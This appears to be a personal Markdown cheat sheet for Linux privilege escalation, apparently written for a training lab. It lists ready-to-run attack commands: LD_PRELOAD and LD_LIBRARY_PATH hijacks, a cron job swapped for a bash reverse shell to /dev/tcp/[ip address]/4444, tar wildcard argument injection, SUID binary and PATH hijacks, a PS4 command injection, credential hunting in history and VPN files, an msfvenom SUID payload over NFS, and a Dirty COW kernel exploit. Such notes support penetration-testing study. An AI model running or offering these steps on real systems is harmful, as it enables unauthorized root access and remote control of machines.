#PrivEsc #Linux 

`mkpasswd -m sha-512 [newpassword] - Generate new password hash

**LD_RELOAD:** Loads a shared object before others when the program is run

**LD_LIBRARY_PATH:** Provides a list of directories where shared libraries are searched for first

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c` - Create a shared object

`sudo LD_PRELOAD=/tmp/preload.so [program you can run as root]` - Get a root shell

`ldd [program location (that you can run as root)]` - See which libraries are used by the program

`gcc -o /tmp/[library name] -shared -fPIC library_path.c` - Create a shared object with the same name as one of the libraries

`sudo LD_LIBRARY_PATH=/tmp [program]` - Get a root shell

## Cron

`#!/bin/bash  `
`bash -i >& /dev/tcp/[ip address]/4444 0>&1` - to replace with the contents of a Cron file

Cron jobs - PATH:

`#!/bin/bash  `
  
`cp /bin/bash /tmp/rootbash  `
`chmod +xs /tmp/rootbash` - Create a sh file with the name of the one that is run by Cron

`chmod +x /home/user/overwrite.sh` - Make it executable

`/tmp/rootbash -p` - Run the file to get a root shell

Cron jobs - Wildcards:

`touch /home/user/--checkpoint=1`
`touch /home/user/--checkpoint-action=exec=shell.elf` - Add those 2 files to where cron will run the tar command and it will treat those as arguments, executing the shell

## SUID/GUID

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` - Find all the SUID/GUID in the machine

**/usr/local/bin/suid-so:**

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"` - Search the output of open/access calls and for no such file errors

`mkdir /home/user/.config` - Make a config file for a shared object

`gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.so(contains a shell code)` - Compile the code into a shared object location

Execute the suid-so file

**/usr/local/bin/suid-env:**

`strings /usr/local/bin/suid-env` - Search for strings of printable characters

`gcc -o service /home/user/tools/suid/service.c` - The service executable being called without a full path so we compile a file with a shell code

`PATH=.:$PATH - Prepend the current directory to the path variable`

`/usr/local/bin/suid-env` - run the file to get a root shell

**/usr/local/bin/suid-env2:**

`/bin/bash --version` - Verify that the version is less than 4.2-048

`function /usr/sbin/service { /bin/bash -p; }` - Create a bash function to execute a new bash shell (-p to preserve permissions)

`export -f /usr/sbin/service` - Export the function

`/usr/local/bin/suid-env2` Run the executable to get root

**Only works for bash versions below 4.4:**

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2` - Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates and SUID version of /bin/bash

`/tmp/rootbash -p` - Run the rootbash file to gain privileges

## History files

`cat ~/.*history | less` - View the contents of all hidden history files in the user's home directory

## Config files

`cat /home/user/myvpn.ovpn` - Can contain reference to a location where root credentials can be found

## SSH keys

`chmod 600 [key]` - Change the permissions of a key

`ssh -i key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@[ip address]` - Login using the key (with additional settings)

## NFS

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user

`cat /etc/exports` - Check NFS configuration

`mkdir /tmp/nfs`
`mount -o rw,vers=3 [ip address]:/tmp /tmp/nfs` - In your own machine create a mount point and than mount the tmp share

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf` - a payload which calls /bin/bash

`chmod +xs /tmp/nfs/shell.elf` - Make sure the file is executable and set the SUID permissions

## Kernel Exploits

**Only use as last resort, can break the system**

`perl linux-exploit-suggester-2.pl` - run **Linux Exploit Suggester 2** to identify potential kernel exploits

`gcc -pthread c0w.c -o c0w` - Compile the Dirty COW exploit

`./c0w` - run the exploit, can take several minutes

`/usr/bin/passwd` - To gain a root shell

`scp [file name] [username]@[ip address]:/dev/shm` - Copy a file to a remote host